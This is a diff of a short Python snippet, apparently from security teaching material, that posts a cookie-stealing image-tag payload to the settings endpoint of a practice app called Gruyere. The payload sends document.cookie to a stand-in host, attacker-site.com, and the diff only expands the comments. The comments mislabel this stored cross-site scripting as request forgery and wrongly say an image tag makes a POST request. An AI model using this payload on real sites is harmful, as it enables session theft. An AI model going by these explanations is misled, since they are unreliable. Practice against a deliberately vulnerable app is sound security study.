@@ -19,8 +19,8 @@ print(response.text)
 **Python Code for Cross-Site Request Forgery**
 
 import requests  
-payload = '<img src="http://attacker-site.com/steal?cookie=" + document.cookie + \'">\';' #Assigning a payload variable which contains malicious content in the form of html image tag sourced from the url shown.'document.cookie' is important as it stores the cookies associated with the web page the attacker wants to make a request to. 
+payload = '<img src="http://attacker-site.com/steal?cookie=" + document.cookie + \'">\';' #Assigning a payload variable which contains malicious content in the form of html image tag sourced from the url shown.'document.cookie' is important as it stores the cookies associated with the web page (the attacker wants to make a request to). The html image tag tricks the web browser into making a POST request to the target website's settings endpoint.
 url = "http://gruyere-app.com/settings" #Target URL
-data = {"description": payload}
-response = requests.post(url, data=data) #'post' allows us to send a http request and in this case, to the target URL.
+data = {"description": payload} #Key value pair 
+response = requests.post(url, data=data) # Requests is a library in python used to make HTTP requests. Post request is made to the target URL and the dictionary 'data' is processed (which contains malicious request/content) which gives attacker access
 print(response.text)
